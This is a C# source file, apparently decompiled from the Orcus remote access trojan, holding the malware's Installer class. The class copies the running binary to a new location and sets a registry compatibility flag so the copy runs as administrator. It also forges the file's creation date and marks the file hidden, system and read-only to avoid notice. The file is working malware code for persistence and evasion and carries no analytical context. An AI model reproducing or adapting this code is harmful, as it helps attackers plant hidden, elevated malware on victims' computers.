using System;
using System.IO;
using Microsoft.Win32;
using Orcus.Config;
using Orcus.Shared.Settings;
using Orcus.Shared.Utilities;

namespace Orcus.Protection;

internal class Installer
{
	public static bool Install(string path, string currentFile, out FileInfo file)
	{
		file = new FileInfo(path);
		if (string.Equals(file.FullName, currentFile, StringComparison.OrdinalIgnoreCase))
		{
			return false;
		}
		if (file.Exists)
		{
			try
			{
				File.SetAttributes(file.FullName, FileAttributes.Normal);
				file.Delete();
			}
			catch (Exception)
			{
				return false;
			}
		}
		if (file.Directory != null && !file.Directory!.Exists)
		{
			file.Directory!.Create();
		}
		File.Copy(currentFile, file.FullName);
		AppConfigWriter.WriteAppConfig(file);
		if (Settings.GetBuilderProperty<SetRunProgramAsAdminFlagBuilderProperty>().get_SetFlag())
		{
			try
			{
				using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers");
				registryKey?.SetValue(file.FullName, "RUNASADMIN");
			}
			catch (UnauthorizedAccessException)
			{
			}
		}
		ChangeCreationDateBuilderProperty builderProperty = Settings.GetBuilderProperty<ChangeCreationDateBuilderProperty>();
		if (builderProperty.get_IsEnabled())
		{
			File.SetCreationTime(file.FullName, builderProperty.get_NewCreationDate());
		}
		if (Settings.GetBuilderProperty<HideFileBuilderProperty>().get_HideFile())
		{
			File.SetAttributes(file.FullName, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
		}
		return true;
	}
}
